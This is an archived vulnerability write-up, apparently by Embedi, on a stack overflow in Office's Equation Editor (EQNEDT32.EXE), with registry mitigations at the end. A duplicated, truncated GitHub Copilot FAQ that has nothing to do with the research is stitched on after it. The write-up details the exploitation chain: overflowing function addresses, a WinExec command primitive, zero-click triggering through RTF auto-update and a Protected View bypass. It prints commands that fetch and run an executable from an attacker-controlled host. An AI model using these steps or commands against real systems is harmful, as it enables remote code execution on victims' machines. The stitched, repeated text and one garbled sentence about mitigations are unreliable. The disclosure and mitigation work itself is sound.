[BinScope](https://web.archive.org/web/20181104111128/https%3A//www.microsoft.com/en-us/download/details.aspx?id=44995), Microsoft verification tool, may come in handy to detect security weaknesses. Although the latest version of BinScope does not support scanning of a catalog on the whole but only individual files stored in it or its sub-catalogs, a simple script written in PS or Python will make the process easier and more convenient. Sure thing, the second option is an older version of BinScope that supports this functionality.

These simple procedures have vital importance as they enable detecting dangerous components installed in a system, i.e. outdated and third-party ones as well as those assembled without security mitigation.

The information collected during the quick analysis of latest components distribution dates was used to make a top of the most “obsolete” components of Microsoft Office 2016 x86.

1. Microsoft Equation Editor (compiled without essential protective measures).
2. ODBC drivers and Redshift libraries (compiled without essential protective measures).
3. ODBC drivers and Salesforce libraries (compiled without essential protective measures).
4. Some .net compilations responsible for Microsoft Office user interface.

After the analysis, BinScope identified the executable module EQNEDT32.EXE (Microsoft Equation Editor – see Fig.1). The component was compiled on 11/9/2000. Without any further compilation, it was used in the following version of Microsoft Office. It seems that the component was developed by Design Science Inc. However, later the respective rights were purchased by Microsoft.

It is also worth mentioning that Binscope marks EQNEDT32.EXE as an unsafe component (see Fig. 2).

The results that [ProcessMitigations tool](https://web.archive.org/web/20181104111128/https%3A//www.powershellgallery.com/packages/ProcessMitigations/1.0.7) showed are rather disappointing for the launched Windows 10 process:(see Fig. 3):

Fig.3. ProcessMitigations tool results

Thus, it was crystal clear that if a vulnerability were found, no security mitigation would prevent an attacker from exploiting it.

Fig. 4. Insertion and editing of equations

It was designed with the help of the OLE technology. Any formula inserted in a document is an OLE object. The component is relevant for Microsoft Office 2000 and Microsoft 2003. Starting with Microsoft Office 2007 package, methods of displaying and editing equations changed, and the component became outdated. Still, it was not removed from the package, probably to ensure the software is compatible with documents of older versions. The component is an OutPorc COM server executed in a separate address space. This means that security mechanisms and policies of the office processes (e.g. WINWORD.EXE, EXCEL.EXE, etc.) do not affect exploitation of the vulnerability in any way, which provides an attacker with a wide array of possibilities (Fig. 5).

Fig. 5. MS Office processes

### OLE technology in a nutshell

To comprehend the way vulnerabilities, embedded in MS Office documents with the help of OLE, can be exploited, one should understand what is this technology is in the first place.

There are two parts in an OLE object embedded in a document:

* internal data
* a picture displayed in the place of an object embedded in a document.

Internal data may be unique, undocumented, and depends on an OLE object embedded in a document (e.g. Excel table, PowerPoint slide).

When a document is opened, a user is shown a picture (Presentation Stream). The OLE component is neither being loaded nor executed. Only when a user double-clicks this object, the procedure of loading OLE from internal data is initiated. The procedure is conducted with the help of COM interface IPersistStorage methods. After that, the DoVerb method is executed for a corresponding action (e.g. Edit).

### EQNEDT32.EXE. Analysis

EQNEDT32.EXE employs a set of standard COM interface for OLE.

* IOleObject
* IDataObject
* IOleInPlaceObject
* IOleInPlaceActiveObject
* IPersistStorage

In terms of vulnerability detection, the Load method of the IPersistStorage is the most promising one. Apparently, internal data of an OLE object is parsed there. Therefore, it may contain a vulnerability.

By using simple reverse engineering techniques, it is possible to find the IPersistStorage : Load method. It is quite evident that the “Equation Native” stream of OLE structured storage compound file is opened and read in it. The stream is used to read internal binary data of an equation, which has the following form (see Fig. 6):

![](/web/20181104111128im_/https://embedi.com/wp-content/uploads/2017/11/word-6_1.png)

Fig. 6. Internal binary data of an equation

It can be seen from the disassembled code of the component that internal data of the equation can be described as follows:

* 2-byte size of the header
* form field of the maximum equation size (4 bytes)
* header with information on the equation structure (24 bytes)
* internal representation of arbitrary length, consisting of elementary symbols and tags, of the equation.

The challenging part of the research was to define the primary procedure that was parsing the equation form. It was the developer who made the task more difficult because copying and saving of the internal form in the HGLOBAL global memory were conducted with the help of global objects with numerous references to them.

The problem was solved by creating two code coverage, using the DBI drcov instrument (a part of the [DynamoRIO framework](https://web.archive.org/web/20181104111128/http%3A//dynamorio.org/docs/page_drcov.html)), to process two different equations. Coverage ration was calculated with the help of the [lighthouse plug-in for IDA PRO](https://web.archive.org/web/20181104111128/https%3A//github.com/gaasedelen/lighthouse) (see Fig. 7).

![](/web/20181104111128im_/https://embedi.com/wp-content/uploads/2017/11/word-7.png)

Fig. 7. Coverage ration

The obtained functions and [AlleyCat](https://web.archive.org/web/20181104111128/https%3A//github.com/devttys0/ida/tree/master/plugins/alleycat) were used to create a path to the IPersistStorage::Load method (see Fig. 8).

The resulting path was a direct one formed by several functions. This way it was possible to identify primary procedures responsible for disassembling of a binary form of an equation, which made the process of finding a vulnerability much easier.

Fig. 8. Path to the IPersistStorage::Load method

## Finding vulnerability

All the latest attacks on Microsoft Office were performed either by using social engineering methods or by exploiting logic vulnerabilities (e.g. **CVE-2017-0199**). A more classic option used in the scope of the research was a **stack based overflow**.

The function with the **004164FA address** was the first to stick out. Its primary function was to copy null-term lines from an internal form to buffer which was sent to it as the first argument (see Fig. 9).

![](/web/20181104111128im_/https://embedi.com/wp-content/uploads/2017/11/word-9.png)

Fig. 9. 004164FA function

The procedure could be called from two other procedures. Both of them send stack data with set length to it. What is more important both procedures were vulnerable to buffer overflow. It was found out that the first call related to operating with a certain window message processed in the EqnFrameWinProc function.

It was found out that the first call related to operating with a certain window message processed in the EqnFrameWinProc function. In other words, exploitation of this call was no trivial task.

The second call, in its turn, related to the processing of a font name that was to be copied from an equation binary form. The call could be executed by calling IPersistStorage::Load. However, a straightforward exploitation of the function was not possible, because if it were overflowed another overflowed procedure would be called. The buffer of the first function would be too large and would overwrite all the argument of the second function that, while being executed, would call wrong addresses. Thus, the component process would crash until it would be called from the vulnerable function. For the sake of convenience, in the scope of the research, we named it LogfontStruct\_Overflow. The function had the 00421774 address and overflowed a buffer in the LOGFONTA structure (see Fig. 10).

![](/web/20181104111128im_/https://embedi.com/wp-content/uploads/2017/11/word-10.png)

Fig. 10. LOGFONTA function

Ironically, but not even correcting buffer size so that it would not overwrite input arguments of the LogfontStruct\_Overflow function, could make the situation any better. Instead, another buffer overflow would be caused by the 004115A7 and 0041160F addresses.

Correcting the size of the passed line again would bring positive results: full control over the address of a function return would be returned and it would be possible to go to the necessary address.

## Vulnerability exploitation

Arbitrary code execution required to execute ret2libc. The first several bytes of known set addresses from EQNEDT32.EXE were zero bytes. That is why it was not possible to copy the ROP chain built by devices from the executable file (there were potential vulnerabilities in the component as well).

The obsolescence of the component resulted in the following:

1. EQNEDT32.EXE developers called for the WinExec function for some unknown reasons.
2. The last described function turned out to be a perfect fit for WinExec.

The point 2 was possible due to the argument that caused buffer overflow being the first one for the function with overflow. The second passed argument was NULL.

![](/web/20181104111128im_/https://embedi.com/wp-content/uploads/2017/11/word-11.png)

Fig. 11. Stack structure

Thus, if the controlled address were jumped to, the stack would have the structure suitable to execute an arbitrary controlled command with the help of WinExec (see Fig. 11).

It resulted in the following primitive: an arbitrary execution of a command with 44 (at most) in it. The restriction was caused by a limited buffer size of the last overflowed function.(see Fig. 12).

![](/web/20181104111128im_/https://embedi.com/wp-content/uploads/2017/11/word-12.png)

Fig. 12. Arbitrary command execution

The size of a massive that could be overflowed by an attacker was 36 bytes (massive overflow\_buffer in the Fig. 12). Moreover, it was possible to use the space of the v12 variable and save EBP, which made extra 8 bytes.

By inserting several OLEs that exploited the described vulnerability, it was possible to execute an arbitrary sequence of commands (e.g. to download an arbitrary file from the Internet and execute it).

One of the easiest ways to execute arbitrary code is to launch an executable file from the WebDAV server controlled by an attacker. However, it is possible only if the WebClient service operates in a proper way (NB. the service is not launched after a system is started). Nonetheless, an attacker can use the described vulnerability to execute the commands like cmd.exe /c start \attacker\_ip\ff. Such a command can be used as a part of an exploit and triggers starting WebClient. After that an attacker can start an executable file from the WebDAV server by using the \attacker\_ip\ff\1.exe command. The starting mechanism of an executable file is similar to that of the \live.sysinternals.com\tools service.

Through the process of exploitation, Microsoft Office Word would enforce visible proper operation and display information (the mentioned Presentation Stream inserted as a picture in place of OLE). This way, it would be even more difficult to detect an attacker.

To update OLEs contained in a document without any interaction with a user (the interaction with an embedded object by double-clicking described above), an attacker could use OLE auto-update, one of the standard features of RTF processor in Microsoft Office. For this purpose, the \bjupdate property had to be added to \object. As a result, the vulnerability would be activated without user interaction.

Following this procedure, Embedi’s experts have managed to create the exploit that:

* works with all the Microsoft Office versions released in the past 17 years (including Microsoft Office 365)
* works with all the Microsoft Windows versions (including Microsoft Windows 10 Creators Update)
* relevant for all the types of architectures
* does not interrupt a user’s work with Microsoft Office
* if a document is opened, does not require any interaction with a user.

The only hindrance here is the protected view mode because it forbids active content execution (OLE/ActiveX/Macro). To bypass it cyber criminals use social engineering techniques. For example, they can ask a user to save a file to the Cloud (OneDrive, GoogleDrive, etc.). In this case, a file obtained from remote sources will not be marked with the MOTW (Mark of The Web) and, when a file is opened, the protected view mode will not be enabled.

However, if the software had been compiled with at least standard security mitigations, it would have been exploitable. All this demonstrates that EQNEDT32.EXE is an obsolete component that may contain a tremendous number of vulnerabilities and security weaknesses, which can be easily exploited.

In the [Microsoft Security Development Lifecycle (SDL)](https://web.archive.org/web/20181104111128/https%3A//msdn.microsoft.com/en-us/library/windows/desktop/cc307418.aspx) Microsoft developers recommend: “Rigorously brought all legacy code up to current security standards”.

## Recommendations on security enhancements

Because the component has numerous security issues and the vulnerabilities it contains can be easily exploited, the best option for a user to ensure security is to disable registering of the component in Windows registry. To do this a user should enter the following command in the command prompt and change XX.X to the correct Office version used:

```
reg add "HKLM\SOFTWARE\Microsoft\Office\XX.X\Common\COM Compatibility\{0002CE02-0000- 0000-C000-000000000046}" /v "Compatibility Flags" /t REG_DWORD /d 0x400
```

or in case of 32-bit Microsoft Office package in x64 OS:

```
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\XX.X\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046}" /v "Compatibility Flags" /t REG_DWORD /d 0x400
```

After that, it will be impossible to start the vulnerable component and exploitation of the vulnerability in MS Office documents will be prevented.

*Embedi team would like to thank Martin Hüsser from [Inter-Networking AG (Switzerland)](https://web.archive.org/web/20181104111128/http%3A//www.internetworking.ch/) for testing and the updating of the command above.*

Also, documents obtained from unknown and untrusted sources should be opened in protected view. The Microsoft Office sandbox (Protected View) is a well-designed one, especially if the AppContainer (Windows 8.1 and newer) is used, while it reduces the possibility of a successful exploitation of vulnerabilities in Microsoft Office down to zero. What is more, it reduces attack surface by prohibiting execution and updating of active content (OLE/ActiveX/Macro), along with loading of components from external sources (e.g. images accessed by a reference link).

Sure thing, the importance of timely security updates should not be neglected either.

## Conclusion

* Even SDL cannot prevent easily exploited vulnerabilities from emerging.
* Third-party and legacy code are sources of major concern for a vendor.
* Security mitigation has vital importance, considering realities of the modern world.
* Software and the system, on the whole, should be updated and supported.

Vulnerabilities and security weaknesses in critical infrastructures and industrial fields are no peculiarity in any way. They are common for automotive industry and embedded devices. The latter, in their turn, are extremely difficult to be updated. What is more important the overwhelming majority of developers have neither security team nor SDL. All these simple facts paint a bleak picture for both developers and users and emphasize the importance of security measure that should be taken to ensure data protection.

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

